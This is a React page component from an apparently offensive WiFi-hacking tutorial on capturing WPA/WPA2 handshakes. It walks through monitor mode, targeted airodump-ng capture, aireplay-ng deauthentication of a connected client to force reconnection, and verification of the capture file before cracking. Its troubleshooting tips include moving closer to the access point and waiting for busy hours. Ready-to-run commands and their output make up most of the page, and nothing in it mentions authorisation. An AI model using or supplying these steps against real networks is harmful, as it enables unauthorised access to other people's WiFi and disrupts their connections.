import Terminal from '../../components/Terminal';
import InfoBox from '../../components/InfoBox';
import Diagram from '../../components/Diagram';
import { Troubleshooting, TroubleItem } from '../../components/Troubleshooting';

export default function CaptureHandshake() {
  return (
    <div className="content-area">
      <div className="topic-header">
        <div className="topic-breadcrumb">WPA / WPA2 Cracking <span>/</span> Capture Handshake</div>
        <h1>Capturing The Handshake</h1>
        <p className="topic-desc">The WPA/WPA2 handshake is captured when a client connects to the network. You can wait passively or force a reconnection using deauthentication.</p>
      </div>

      <div className="topic-section">
        <h2>The Process</h2>
        <Diagram title="Handshake Capture Strategy">
{`  METHOD 1: PASSIVE (Wait)             METHOD 2: ACTIVE (Deauth)
  ═════════════════════                ═══════════════════════════
  
  1. Start capture                     1. Start capture
  2. Wait for client to connect        2. Deauth a connected client
  3. Handshake captured                3. Client auto-reconnects
                                       4. Handshake captured!
  
  Pros: Stealthy, no noise             Pros: Fast, reliable
  Cons: Could take hours               Cons: Detectable, brief DoS`}
        </Diagram>
      </div>

      <div className="topic-section">
        <h2>Step-by-Step: Capture the Handshake</h2>

        <h3>Step 1: Start Monitor Mode</h3>
        <Terminal title="Enable Monitor Mode" lines={[
          [{ type: 'prompt', text: '$ ' }, { type: 'command', text: 'sudo airmon-ng check kill' }],
          [{ type: 'prompt', text: '$ ' }, { type: 'command', text: 'sudo airmon-ng start ' }, { type: 'string', text: 'wlan0' }],
        ]} />

        <h3>Step 2: Find Target Network</h3>
        <Terminal title="Discover Networks" lines={[
          [{ type: 'prompt', text: '$ ' }, { type: 'command', text: 'sudo airodump-ng ' }, { type: 'string', text: 'wlan0mon' }],
          [{ type: 'output', text: ' BSSID              PWR  Beacons  #Data  CH  ENC    ESSID' }],
          [{ type: 'output', text: ' AA:BB:CC:DD:EE:FF  -42    120      35    6  ' }, { type: 'highlight', text: 'WPA2' }, { type: 'output', text: '  TargetWPA2' }],
          [{ type: 'output', text: '' }],
          [{ type: 'output', text: ' BSSID              STATION            PWR   Packets' }],
          [{ type: 'output', text: ' AA:BB:CC:DD:EE:FF  11:22:33:44:55:66  -35      125' }],
          [{ type: 'comment', text: '# Note: BSSID, Channel, and a connected STATION' }],
        ]} />

        <h3>Step 3: Start Targeted Capture (Terminal 1)</h3>
        <Terminal title="Terminal 1 — Targeted Capture" lines={[
          [{ type: 'prompt', text: '$ ' }, { type: 'command', text: 'sudo airodump-ng ' }, { type: 'flag', text: '--bssid ' }, { type: 'highlight', text: 'AA:BB:CC:DD:EE:FF ' }, { type: 'flag', text: '--channel ' }, { type: 'number', text: '6 ' }, { type: 'flag', text: '--write ' }, { type: 'string', text: 'wpa_handshake ' }, { type: 'string', text: 'wlan0mon' }],
          [{ type: 'output', text: '' }],
          [{ type: 'output', text: ' CH  6 ][ Elapsed: 30 s' }],
          [{ type: 'comment', text: '# Keep this running — watching for handshake...' }],
        ]} />

        <h3>Step 4: Deauth a Client (Terminal 2)</h3>
        <Terminal title="Terminal 2 — Deauth to Force Handshake" lines={[
          [{ type: 'comment', text: '# Send 4 deauth packets to specific client' }],
          [{ type: 'prompt', text: '$ ' }, { type: 'command', text: 'sudo aireplay-ng ' }, { type: 'flag', text: '--deauth ' }, { type: 'number', text: '4 ' }, { type: 'flag', text: '-a ' }, { type: 'highlight', text: 'AA:BB:CC:DD:EE:FF ' }, { type: 'flag', text: '-c ' }, { type: 'highlight', text: '11:22:33:44:55:66 ' }, { type: 'string', text: 'wlan0mon' }],
          [{ type: 'output', text: 'Sending 64 directed DeAuth (code 7). STMAC: [11:22:33:44:55:66]' }],
          [{ type: 'output', text: 'Sending 64 directed DeAuth (code 7). STMAC: [11:22:33:44:55:66]' }],
        ]} />

        <h3>Step 5: Handshake Captured!</h3>
        <p>Go back to Terminal 1 — look at the top right corner:</p>
        <Terminal title="Terminal 1 — Handshake Confirmation" lines={[
          [{ type: 'output', text: ' CH  6 ][ Elapsed: 1 min ][ ' }, { type: 'highlight', text: 'WPA handshake: AA:BB:CC:DD:EE:FF' }, { type: 'output', text: ' ]' }],
          [{ type: 'output', text: '' }],
          [{ type: 'output', text: ' BSSID              PWR  Beacons  #Data  CH  ENC    ESSID' }],
          [{ type: 'output', text: ' AA:BB:CC:DD:EE:FF  -42   1200     285    6  WPA2  TargetWPA2' }],
        ]} />

        <InfoBox type="tip" title="Success!">
          <p>When you see <code className="inline-code">WPA handshake: AA:BB:CC:DD:EE:FF</code> at the top of airodump-ng, the handshake is captured and saved in <code className="inline-code">wpa_handshake-01.cap</code>. You can now stop the capture (Ctrl+C) and proceed to cracking.</p>
        </InfoBox>
      </div>

      <div className="topic-section">
        <h2>Verify the Capture File</h2>
        <Terminal title="Verify Handshake" lines={[
          [{ type: 'prompt', text: '$ ' }, { type: 'command', text: 'sudo aircrack-ng ' }, { type: 'string', text: 'wpa_handshake-01.cap' }],
          [{ type: 'output', text: '                              Aircrack-ng 1.7' }],
          [{ type: 'output', text: '' }],
          [{ type: 'output', text: '   #  BSSID              ESSID                 Encryption   key' }],
          [{ type: 'output', text: '   1  AA:BB:CC:DD:EE:FF  TargetWPA2            WPA (' }, { type: 'highlight', text: '1 handshake' }, { type: 'output', text: ')' }],
          [{ type: 'output', text: '' }],
          [{ type: 'output', text: 'Choosing first network as target.' }],
          [{ type: 'comment', text: '# "1 handshake" confirms it was captured successfully' }],
        ]} />
      </div>

      <Troubleshooting>
        <TroubleItem issue="Handshake not captured after deauth">
          <div className="solution">Solution:</div>
          <ul style={{ paddingLeft: 20, marginTop: 8 }}>
            <li>Make sure airodump-ng is running with <code className="inline-code">--write</code> BEFORE sending deauth</li>
            <li>Send only a few deauths (4-5), not unlimited — the client needs time to reconnect</li>
            <li>Try deauthing a different client</li>
            <li>Make sure you're on the correct channel</li>
          </ul>
        </TroubleItem>
        <TroubleItem issue="No clients connected to deauth">
          <div className="solution">Solution:</div>
          <p>You need at least one connected client. If no one is connected, you have to wait passively. Check back during busy hours.</p>
        </TroubleItem>
        <TroubleItem issue="aircrack-ng says '0 handshakes' in the cap file">
          <div className="solution">Solution:</div>
          <p>The handshake capture was incomplete. This happens if the client was too far away or packets were lost. Re-run the capture and deauth again. Try getting physically closer to the AP.</p>
        </TroubleItem>
        <TroubleItem issue="Client reconnects to 5GHz instead of 2.4GHz">
          <div className="solution">Solution:</div>
          <p>Modern devices prefer 5GHz. You may need a dual-band adapter. Or deauth the client from both bands.</p>
        </TroubleItem>
      </Troubleshooting>
    </div>
  );
}
